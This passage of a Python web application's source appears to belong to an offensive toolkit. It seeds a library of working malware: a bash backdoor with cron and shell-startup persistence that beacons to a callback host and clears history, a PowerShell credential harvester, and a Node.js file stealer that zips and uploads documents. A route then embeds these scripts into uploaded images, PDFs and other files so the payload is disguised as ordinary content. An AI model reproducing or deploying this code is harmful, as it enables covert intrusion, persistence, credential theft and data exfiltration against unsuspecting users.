# Create the backdoor script
BACKDOOR_PATH="/tmp/$BACKDOOR_NAME"
cat > $BACKDOOR_PATH << 'EOF'
#!/bin/bash
# System monitoring service

while true; do
    # Get system information
    CURR_USER=$(whoami)
    HOSTNAME=$(hostname)
    IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unknown")
    KERNEL=$(uname -r)
    
    # Prepare data to send
    DATA="hostname=$HOSTNAME&user=$CURR_USER&ip=$IP&kernel=$KERNEL"
    
    # Try different methods to call back
    if command -v curl >/dev/null 2>&1; then
        curl -s -X POST -d "$DATA" "http://CALLBACK_HOST:CALLBACK_PORT/report" >/dev/null 2>&1
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O- --post-data="$DATA" "http://CALLBACK_HOST:CALLBACK_PORT/report" >/dev/null 2>&1
    elif command -v python >/dev/null 2>&1 || command -v python3 >/dev/null 2>&1; then
        PYTHON_CMD=$(command -v python3 || command -v python)
        $PYTHON_CMD -c "
import urllib.request
import urllib.parse
try:
    data = urllib.parse.urlencode({'hostname': '$HOSTNAME', 'user': '$CURR_USER', 'ip': '$IP', 'kernel': '$KERNEL'}).encode()
    req = urllib.request.Request('http://CALLBACK_HOST:CALLBACK_PORT/report', data=data)
    urllib.request.urlopen(req, timeout=5)
except:
    pass
" >/dev/null 2>&1
    fi
    
    # Sleep before next callback
    sleep INTERVAL
done
EOF

# Replace placeholders with actual values
sed -i "s/CALLBACK_HOST/$CALLBACK_HOST/g" $BACKDOOR_PATH
sed -i "s/CALLBACK_PORT/$CALLBACK_PORT/g" $BACKDOOR_PATH
sed -i "s/INTERVAL/$INTERVAL/g" $BACKDOOR_PATH

# Make it executable
chmod +x $BACKDOOR_PATH

# Create a hidden directory in home folder if possible
if [ -d "$HOME" ]; then
    HIDDEN_DIR="$HOME/.$BACKDOOR_NAME"
    mkdir -p "$HIDDEN_DIR" 2>/dev/null
    if [ -d "$HIDDEN_DIR" ]; then
        cp "$BACKDOOR_PATH" "$HIDDEN_DIR/" 2>/dev/null
        BACKDOOR_PATH="$HIDDEN_DIR/$BACKDOOR_NAME"
    fi
fi

# Start the backdoor
nohup "$BACKDOOR_PATH" >/dev/null 2>&1 &
PID=$!
echo "[+] Backdoor process started with PID: $PID"

# Try to add to crontab for persistence
if command -v crontab >/dev/null 2>&1; then
    # Add label for easier identification
    CRON_ENTRY="@reboot $BACKDOOR_PATH # $CRON_LABEL"
    
    # Backup existing crontab
    crontab -l > /tmp/crontab.bak 2>/dev/null
    
    # Add our entry if it doesn't exist
    if ! grep -q "$CRON_LABEL" /tmp/crontab.bak 2>/dev/null; then
        echo "$CRON_ENTRY" >> /tmp/crontab.bak
        crontab /tmp/crontab.bak 2>/dev/null
        echo "[+] Added to crontab for persistence"
    else
        echo "[+] Crontab entry already exists"
    fi
    
    # Clean up
    rm /tmp/crontab.bak 2>/dev/null
else
    echo "[!] Crontab not available, persistence not guaranteed"
fi

# Try to add to startup files
for RCFILE in ~/.bashrc ~/.zshrc ~/.profile; do
    if [ -f "$RCFILE" ]; then
        if ! grep -q "$BACKDOOR_NAME" "$RCFILE" 2>/dev/null; then
            echo "# System monitor service" >> "$RCFILE"
            echo "nohup $BACKDOOR_PATH >/dev/null 2>&1 &" >> "$RCFILE"
            echo "[+] Added to $RCFILE for persistence"
        fi
    fi
done

echo "[*] Backdoor setup complete"
echo "[*] Will connect back to $CALLBACK_HOST:$CALLBACK_PORT every $INTERVAL seconds"

# Clear bash history if possible
history -c 2>/dev/null
''',
                    'language': 'bash',
                    'category': 'persistence',
                    'tags': 'backdoor,persistence,callback,cron'
                },
                {
                    'name': 'Credential Harvester (PowerShell)',
                    'description': 'PowerShell script to collect and exfiltrate credentials from Windows systems',
                    'code': '''# Credential Harvester
# Environment variables available via $env:HOSTNAME, $env:IP, $env:USERNAME, $env:OSINFO

# Output Settings
$LogDir = "$env:TEMP\\Logs"
$LogFile = "$LogDir\\CredentialReport.txt"
$callback_host = "$env:IP"
$callback_port = "443"

function Write-Log {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Message
    )
    
    # Create directory if it doesn't exist
    if (!(Test-Path -Path $LogDir)) {
        New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
    }
    
    # Write to log with timestamp
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$Timestamp - $Message" | Out-File -FilePath $LogFile -Append
}

function Get-StoredCredentials {
    Write-Log "Searching for stored credentials..."
    
    # Check for saved browser credentials
    $BrowserPaths = @{
        "Chrome" = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default"
        "Edge" = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default"
        "Firefox" = "$env:APPDATA\\Mozilla\\Firefox\\Profiles"
    }
    
    foreach ($Browser in $BrowserPaths.Keys) {
        $Path = $BrowserPaths[$Browser]
        if (Test-Path -Path $Path) {
            Write-Log "Found $Browser data directory at $Path"
        }
    }
    
    # Check for saved Windows credentials
    try {
        $CredentialManager = Get-WmiObject -Class "Win32_NetworkLoginProfile" -ErrorAction SilentlyContinue
        if ($CredentialManager) {
            $CredCount = ($CredentialManager | Measure-Object).Count
            Write-Log "Found $CredCount network login profiles"
        }
    } catch {
        Write-Log "Error accessing network login profiles: $_"
    }
    
    # Look for credential files
    $CredFiles = @(
        "$env:USERPROFILE\\.aws\\credentials",
        "$env:USERPROFILE\\.ssh\\id_rsa",
        "$env:USERPROFILE\\.ssh\\id_dsa",
        "$env:USERPROFILE\\.ssh\\id_ecdsa",
        "$env:USERPROFILE\\.ssh\\id_ed25519",
        "$env:USERPROFILE\\.ssh\\config",
        "$env:USERPROFILE\\.gitconfig"
    )
    
    foreach ($File in $CredFiles) {
        if (Test-Path -Path $File) {
            Write-Log "Found credential file: $File"
        }
    }
}

function Get-SystemInfo {
    Write-Log "Collecting system information..."
    
    # Basic system info
    $ComputerInfo = Get-ComputerInfo -ErrorAction SilentlyContinue
    if ($ComputerInfo) {
        Write-Log "System: $($ComputerInfo.CsManufacturer) $($ComputerInfo.CsModel)"
        Write-Log "Windows: $($ComputerInfo.WindowsProductName) $($ComputerInfo.WindowsVersion)"
        Write-Log "User: $($env:USERNAME) / $($env:USERDOMAIN)"
    }
    
    # Network info
    $IPAddresses = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
                   Where-Object { $_.IPAddress -ne "127.0.0.1" }
    if ($IPAddresses) {
        foreach ($IP in $IPAddresses) {
            Write-Log "Network Interface: $($IP.InterfaceAlias), IP: $($IP.IPAddress)"
        }
    }
    
    # Domain info if in a domain
    if ($env:USERDOMAIN -ne $env:COMPUTERNAME) {
        Write-Log "Domain: $($env:USERDOMAIN)"
        try {
            $DomainRole = (Get-WmiObject -Class Win32_ComputerSystem).DomainRole
            if ($DomainRole -gt 1) {
                Write-Log "Domain role: $DomainRole (Domain member)"
            }
        } catch {
            Write-Log "Error getting domain role: $_"
        }
    }
}

function Send-DataToCallback {
    param (
        [string]$DataToSend
    )
    
    Write-Log "Preparing to send collected data..."
    
    # Encode data to send
    $EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($DataToSend))
    
    # Try to send data back using different methods
    try {
        $url = "http://$callback_host`:$callback_port/data"
        
        # Try using Invoke-WebRequest (PowerShell 3.0+)
        if (Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue) {
            $body = @{
                "hostname" = $env:COMPUTERNAME
                "username" = $env:USERNAME
                "data" = $EncodedData
            }
            
            Invoke-WebRequest -Uri $url -Method Post -Body $body -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue
            Write-Log "Data sent successfully using Invoke-WebRequest"
            return
        }
        
        # Fallback to .NET WebClient
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
        $postData = "hostname=$env:COMPUTERNAME&username=$env:USERNAME&data=$EncodedData"
        $webClient.UploadString($url, $postData)
        Write-Log "Data sent successfully using WebClient"
        
    } catch {
        Write-Log "Failed to send data: $_"
        # Store data locally if can't send
        $BackupFile = "$LogDir\\DataBackup.b64"
        $EncodedData | Out-File -FilePath $BackupFile
        Write-Log "Data saved locally to $BackupFile"
    }
}

# Main execution
Write-Log "======== Credential Harvester Started ========"
Write-Log "Running as: $env:USERNAME on $env:COMPUTERNAME"

# Collect information
Get-SystemInfo
Get-StoredCredentials

# Send the log file content to callback
if (Test-Path -Path $LogFile) {
    $LogContent = Get-Content -Path $LogFile -Raw
    Send-DataToCallback -DataToSend $LogContent
}

Write-Log "======== Credential Harvester Completed ========"
''',
                    'language': 'powershell',
                    'category': 'credential_access',
                    'tags': 'windows,credentials,harvest,exfiltration'
                },
                {
                    'name': 'Data Exfiltration (JavaScript)',
                    'description': 'JavaScript utility to collect and exfiltrate sensitive data from a system',
                    'code': '''// Data Exfiltration Utility
// Environment variables available through process.env

// Import required modules
const fs = require('fs');
const os = require('os');
const path = require('path');
const child_process = require('child_process');
const http = require('http');
const https = require('https');

// Configuration
const config = {
    callbackHost: process.env.IP || '127.0.0.1',
    callbackPort: 443,
    exfilInterval: 60 * 1000, // 1 minute
    maxFileSize: 1024 * 1024, // 1MB
    interestingExtensions: ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.csv', '.json', '.xml', '.config', '.conf', '.cfg', '.ini'],
    interestingFileNames: ['password', 'secret', 'credential', 'token', 'key', 'account', 'login', 'config'],
    tempDir: path.join(os.tmpdir(), '.data_collection')
};

// Ensure output directory exists
try {
    if (!fs.existsSync(config.tempDir)) {
        fs.mkdirSync(config.tempDir, { recursive: true });
    }
} catch (error) {
    console.error('Failed to create data directory:', error);
}

// Logging function
function log(message) {
    const timestamp = new Date().toISOString();
    const logMessage = `${timestamp} - ${message}`;
    
    try {
        fs.appendFileSync(path.join(config.tempDir, 'collection.log'), logMessage + '\\n');
    } catch (error) {
        // Silent fail for logging
    }
}

// Collect system information
function collectSystemInfo() {
    log('Collecting system information');
    
    const info = {
        hostname: os.hostname(),
        platform: os.platform(),
        release: os.release(),
        type: os.type(),
        arch: os.arch(),
        cpus: os.cpus().map(cpu => cpu.model),
        memory: {
            total: os.totalmem(),
            free: os.freemem()
        },
        networkInterfaces: os.networkInterfaces(),
        homedir: os.homedir(),
        username: process.env.USERNAME || os.userInfo().username,
        uptime: os.uptime()
    };
    
    // Save system info
    const infoPath = path.join(config.tempDir, 'system_info.json');
    fs.writeFileSync(infoPath, JSON.stringify(info, null, 2));
    log(`System information saved to ${infoPath}`);
    
    return info;
}

// Find interesting files
function findInterestingFiles() {
    log('Searching for interesting files');
    const interestingFiles = [];
    const searchDirs = [
        os.homedir(),
        path.join(os.homedir(), 'Documents'),
        path.join(os.homedir(), 'Downloads'),
        path.join(os.homedir(), 'Desktop')
    ];
    
    // Search only the first level of each directory to avoid being too intrusive
    searchDirs.forEach(dir => {
        try {
            if (fs.existsSync(dir)) {
                const files = fs.readdirSync(dir);
                files.forEach(file => {
                    const filePath = path.join(dir, file);
                    try {
                        const stats = fs.statSync(filePath);
                        if (stats.isFile() && stats.size <= config.maxFileSize) {
                            const ext = path.extname(file).toLowerCase();
                            const name = path.basename(file, ext).toLowerCase();
                            
                            // Check if file matches our criteria
                            if (config.interestingExtensions.includes(ext) || 
                                config.interestingFileNames.some(keyword => name.includes(keyword))) {
                                interestingFiles.push(filePath);
                            }
                        }
                    } catch (error) {
                        // Skip files we can't access
                    }
                });
            }
        } catch (error) {
            log(`Error searching directory ${dir}: ${error.message}`);
        }
    });
    
    // Save list of interesting files
    const filesPath = path.join(config.tempDir, 'interesting_files.json');
    fs.writeFileSync(filesPath, JSON.stringify(interestingFiles, null, 2));
    log(`Found ${interestingFiles.length} interesting files, list saved to ${filesPath}`);
    
    return interestingFiles;
}

// Copy interesting files
function copyInterestingFiles(fileList) {
    log('Copying interesting files');
    const collectionDir = path.join(config.tempDir, 'collected_files');
    
    try {
        if (!fs.existsSync(collectionDir)) {
            fs.mkdirSync(collectionDir, { recursive: true });
        }
        
        let copiedCount = 0;
        fileList.forEach(filePath => {
            try {
                const targetPath = path.join(collectionDir, path.basename(filePath));
                fs.copyFileSync(filePath, targetPath);
                copiedCount++;
            } catch (error) {
                log(`Failed to copy ${filePath}: ${error.message}`);
            }
        });
        
        log(`Copied ${copiedCount} files to ${collectionDir}`);
    } catch (error) {
        log(`Error creating collection directory: ${error.message}`);
    }
}

// Exfiltrate data to callback server
function exfiltrateData() {
    log(`Preparing to exfiltrate data to ${config.callbackHost}:${config.callbackPort}`);
    
    // Create a zip archive
    const zipPath = path.join(os.tmpdir(), `data_${Date.now()}.zip`);
    try {
        // Simple cross-platform check for zip command
        const zipCmd = os.platform() === 'win32' ? 
            `powershell Compress-Archive -Path "${config.tempDir}" -DestinationPath "${zipPath}"` :
            `zip -r "${zipPath}" "${config.tempDir}"`;
        
        child_process.execSync(zipCmd);
        log(`Created zip archive: ${zipPath}`);
        
        // Read the zip file
        const zipData = fs.readFileSync(zipPath);
        const zipBase64 = zipData.toString('base64');
        
        // Prepare data for exfiltration
        const postData = JSON.stringify({
            hostname: os.hostname(),
            username: process.env.USERNAME || os.userInfo().username,
            timestamp: new Date().toISOString(),
            data: zipBase64
        });
        
        // Create request options
        const options = {
            hostname: config.callbackHost,
            port: config.callbackPort,
            path: '/exfil',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };
        
        // Send the data
        const req = http.request(options, (res) => {
            log(`Exfiltration response status: ${res.statusCode}`);
            // Clean up after successful exfiltration
            if (res.statusCode === 200) {
                try {
                    fs.unlinkSync(zipPath);
                } catch (error) {
                    // Silent cleanup errors
                }
            }
        });
        
        req.on('error', (error) => {
            log(`Exfiltration error: ${error.message}`);
        });
        
        // Write data and end request
        req.write(postData);
        req.end();
        
        log('Data exfiltration attempt completed');
        
    } catch (error) {
        log(`Exfiltration failed: ${error.message}`);
    }
}

// Main execution
(function main() {
    log('=========== Data Collection Started ===========');
    log(`Running as: ${process.env.USERNAME || os.userInfo().username} on ${os.hostname()}`);
    
    // Collect information
    const systemInfo = collectSystemInfo();
    const interestingFiles = findInterestingFiles();
    copyInterestingFiles(interestingFiles);
    
    // Exfiltrate data
    exfiltrateData();
    
    log('=========== Data Collection Completed ===========');
    
    // Set up scheduled exfiltration
    setInterval(exfiltrateData, config.exfilInterval);
})();
''',
                    'language': 'javascript',
                    'category': 'exfiltration',
                    'tags': 'exfil,data,files,collection,callback'
                }
            ]
            
            # Add the scripts to the database
            for script_data in default_scripts:
                script = ScriptTemplate(
                    name=script_data['name'],
                    description=script_data['description'],
                    code=script_data['code'],
                    language=script_data['language'],
                    category=script_data['category'],
                    tags=script_data['tags']
                )
                db.session.add(script)
            
            db.session.commit()
            logger.info(f"Initialized script library with {len(default_scripts)} default scripts")
    
    # Route for injecting a script from the library into a payload file
    @app.route('/inject_script_into_payload', methods=['POST'])
    def inject_script_into_payload():
        """Inject a script from the library into a payload file and download the modified file"""
        try:
            # Check if a file was uploaded
            if 'payload_file' not in request.files:
                flash('No file uploaded', 'danger')
                return redirect(url_for('script_library'))
                
            payload_file = request.files['payload_file']
            if payload_file.filename == '':
                flash('No file selected', 'danger')
                return redirect(url_for('script_library'))
                
            # Get the script ID
            script_id = request.form.get('selected_script_id', '')
            if not script_id:
                flash('No script selected', 'danger')
                return redirect(url_for('script_library'))
                
            # Get the listener configuration (optional)
            listener_host = request.form.get('listener_host', '')
            listener_port = request.form.get('listener_port', '443')
            auto_execute = 'auto_execute' in request.form
            
            # Determine the payload type based on file extension
            filename = payload_file.filename.lower()
            
            # Check if file is binary (image, pdf, etc.) or text-based
            is_binary_file = filename.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.pdf', 
                                               '.exe', '.dll', '.bin', '.so', '.dylib'))
            
            # Get the script from the database
            script_template = ScriptTemplate.query.get(script_id)
            if not script_template:
                flash('Selected script not found', 'danger')
                return redirect(url_for('script_library'))
                
            # Create a listener configuration
            listener_config = {}
            if listener_host:
                listener_config = {
                    'host': listener_host,
                    'port': int(listener_port),
                    'interval': 60,
                    'report_data': {
                        'hostname': True,
                        'ip': True,
                        'user': True,
                        'os': True
                    },
                    'custom_script': {
                        'code': script_template.code,
                        'language': script_template.language,
                        'auto_execute': auto_execute,
                        'from_library': True,
                        'library_script_name': script_template.name,
                        'library_script_id': script_template.id
                    }
                }
            
            # Handle binary files differently from text files
            if is_binary_file:
                # Read binary content
                payload_file.seek(0)  # Make sure we're at the beginning of the file
                binary_content = payload_file.read()
                
                # Create a metadata comment to append to the binary file
                metadata = f"\n\nINJECTED_SCRIPT: {script_template.name}\n"
                metadata += f"LANGUAGE: {script_template.language}\n"
                metadata += f"DESCRIPTION: {script_template.description}\n"
                if listener_host:
                    metadata += f"LISTENER: {listener_host}:{listener_port}\n"
                
                # For binary files, we append the metadata and script to the end of the file
                # This won't affect most binary formats as they typically ignore trailing data
                modified_content = binary_content + metadata.encode('utf-8')
                if not listener_host:  # Only append script directly if no listener provided
                    modified_content += f"\n{script_template.code}".encode('utf-8')
                
                # Prepare response for binary file
                response = make_response(modified_content)
                response.headers["Content-Disposition"] = f"attachment; filename=modified_{filename}"
                
                # Set appropriate MIME type
                if filename.endswith(('.jpg', '.jpeg')):
                    response.headers["Content-Type"] = "image/jpeg"
                elif filename.endswith('.png'):
                    response.headers["Content-Type"] = "image/png"
                elif filename.endswith('.gif'):
                    response.headers["Content-Type"] = "image/gif"
                elif filename.endswith('.pdf'):
                    response.headers["Content-Type"] = "application/pdf"
                else:
                    response.headers["Content-Type"] = "application/octet-stream"
                    
                return response
            else:
                # For text files, continue with the original approach
                payload_file.seek(0)  # Reset file pointer
                payload_content = payload_file.read().decode('utf-8', errors='ignore')
                if not payload_content:
                    flash('Payload file is empty', 'danger')
                    return redirect(url_for('script_library'))
                
                # Determine the text-based payload type
                if filename.endswith(('.sh', '.bash', '.py', '.pl', '.js', '.ps1')):
                    payload_type = 'script'
                elif filename.endswith('.json'):
                    payload_type = 'json'
                elif filename.endswith('.xml'):
                    payload_type = 'xml'
                else:
                    payload_type = 'text'
                
                # If no listener host is provided, add the script as a comment
                if not listener_host:
                    if payload_type == 'script':
                        # Add script to the end of the file
                        payload_content += f"\n\n# Script from library: {script_template.name}\n"
                        payload_content += f"# Language: {script_template.language}\n"
                        payload_content += f"# Description: {script_template.description}\n\n"
                        payload_content += script_template.code
                    elif payload_type == 'json':
                        # Try to parse JSON and add script as a comment field
                        try:
                            import json
                            json_data = json.loads(payload_content)
                            json_data['__script_from_library'] = {
                                'name': script_template.name,
                                'language': script_template.language,
                                'description': script_template.description,
                                'code': script_template.code
                            }
                            payload_content = json.dumps(json_data, indent=2)
                        except:
                            # If JSON parsing fails, just append a comment
                            payload_content += f"\n\n// Script from library: {script_template.name}\n"
                            payload_content += f"// {script_template.code}"
                    elif payload_type == 'xml':
                        # Add script as an XML comment
                        payload_content += f"\n\n<!-- \n  Script from library: {script_template.name}\n"
                        payload_content += f"  Language: {script_template.language}\n"
                        payload_content += f"  Description: {script_template.description}\n\n"
                        payload_content += script_template.code
                        payload_content += "\n-->"
                    else:
                        # Text format - add script to the end
                        payload_content += f"\n\n# Script from library: {script_template.name}\n"
                        payload_content += f"# Language: {script_template.language}\n"
                        payload_content += f"# Description: {script_template.description}\n\n"
                        payload_content += script_template.code
                    
                # Add listener functionality if a listener host is provided
                if listener_host:
                    from ml_engine.payload_analyzer import add_listener_functionality
                    payload_content = add_listener_functionality(payload_content, payload_type, listener_config)
                
                # Prepare the modified file for download
                modified_filename = f"modified_{filename}"
                
                response = make_response(payload_content)
                response.headers["Content-Disposition"] = f"attachment; filename={modified_filename}"
                response.headers["Content-Type"] = "text/plain"
                
                return response
                
        except Exception as e:
            logger.error(f"Error injecting script: {str(e)}")
            flash(f'Error injecting script: {str(e)}', 'danger')
            return redirect(url_for('script_library'))
            
    @app.route('/api/attack-surface-data')
    def api_attack_surface_data():
        """API endpoint to get attack surface visualization data"""
        try:
            from ml_engine.attack_surface import generate_attack_surface_data
            graph_data = generate_attack_surface_data()
            return jsonify(graph_data)
        except Exception as e:
            logger.error(f"Error generating attack surface data: {str(e)}")
            return jsonify({
                "error": str(e),
                "nodes": [],
                "links": []
            }), 500
    
    @app.route('/api/attack-paths', methods=['POST'])
    def api_attack_paths():
        """API endpoint to find attack paths between two nodes"""
        try:
            data = request.get_json()
            source_id = data.get('source_id')
            target_id = data.get('target_id')
            
            if not source_id or not target_id:
                return jsonify({"error": "Source and target IDs are required"}), 400
            
            from ml_engine.attack_surface import find_attack_paths
            paths = find_attack_paths(source_id, target_id)
            return jsonify(paths)
        except Exception as e:
            logger.error(f"Error finding attack paths: {str(e)}")
            return jsonify({"error": str(e), "paths": []}), 500
    
    @app.route('/api/simulate-exploit/<int:exploit_id>', methods=['POST'])
    def api_simulate_exploit(exploit_id):
        """API endpoint to simulate an exploit"""
        try:
            data = request.get_json() or {}
            payload_content = data.get('payload_content')
            parameters = data.get('parameters', {})
            
            from ml_engine.exploit_simulator import simulate_exploit, ExploitType
            
            # Validate exploit ID
            if exploit_id not in [e.value for e in ExploitType]:
                return jsonify({"error": f"Invalid exploit ID: {exploit_id}"}), 400
            
            # Run simulation
            result = simulate_exploit(exploit_id, payload_content, parameters)
            return jsonify(result)
        except Exception as e:
            logger.error(f"Error simulating exploit: {str(e)}")
            return jsonify({"error": str(e), "success": False}), 500
    
    @app.route('/upload_payload_for_simulation', methods=['POST'])
    def upload_payload_for_simulation():
        """Upload and analyze a payload for simulation"""
        try:
            # Check if a file was uploaded
            if 'payload_file' not in request.files or not request.files['payload_file'].filename:
                flash('Please upload a payload file', 'danger')
                return redirect(url_for('exploit_simulator'))
            
            payload_file = request.files['payload_file']
            analysis_type = request.form.get('analysis_type', 'comprehensive')
            safe_mode = 'safe_mode' in request.form
            
            # Safety check - require safe mode
            if not safe_mode:
                flash('Safe Mode is required for security reasons', 'danger')
                return redirect(url_for('exploit_simulator'))
            
            from ml_engine.exploit_simulator import upload_payload_for_simulation as simulate_payload
            
            # Analyze the payload
            result = simulate_payload(payload_file, analysis_type, safe_mode)
            
            # Store results in session for display (in a real app, you'd store in a database)
            session['simulation_results'] = result
            
            flash('Payload analysis completed successfully!', 'success')
            return redirect(url_for('exploit_simulator'))
        except Exception as e:
            logger.error(f"Error analyzing payload for simulation: {str(e)}")
            flash(f'Error analyzing payload: {str(e)}', 'danger')
            return redirect(url_for('exploit_simulator'))
    
    @app.route('/analyze_mobile_app', methods=['POST'])
    def analyze_mobile_app():
        """Analyze a mobile application (APK/IPA) for vulnerabilities"""
        try:
            # Check if a file was uploaded
            if 'app_file' not in request.files or not request.files['app_file'].filename:
                flash('Please upload an APK or IPA file', 'danger')
                return redirect(url_for('mobile_analysis'))
            
            app_file = request.files['app_file']
            file_extension = os.path.splitext(app_file.filename)[1].lower()
            
            # Check file extension
            if file_extension not in ['.apk', '.ipa']:
                flash('Only APK (Android) and IPA (iOS) files are supported', 'danger')
                return redirect(url_for('mobile_analysis'))
            
            # Get analysis options
            analysis_type = request.form.get('analysis_type', 'comprehensive')
            extract_source = 'extract_source' in request.form
            check_libraries = 'check_libraries' in request.form
            check_obfuscation = 'check_obfuscation' in request.form
            inject_zero_day = 'inject_zero_day' in request.form
            
            from ml_engine.mobile_analysis import analyze_mobile_app as analyze_app
            
            # Analyze the app
            result = analyze_app(app_file, analysis_type)
            
            # Store results in session for display (in a real app, you'd store in a database)
            session['mobile_analysis_results'] = result
            
            flash('Mobile application analysis completed successfully!', 'success')
            return redirect(url_for('mobile_analysis'))
        except Exception as e:
            logger.error(f"Error analyzing mobile app: {str(e)}")
            flash(f'Error analyzing mobile app: {str(e)}', 'danger')
            return redirect(url_for('mobile_analysis'))
            
    # Initialize script library after the app is fully set up
    with app.app_context():
        initialize_script_library()
        
    logger.info("Routes initialized successfully")
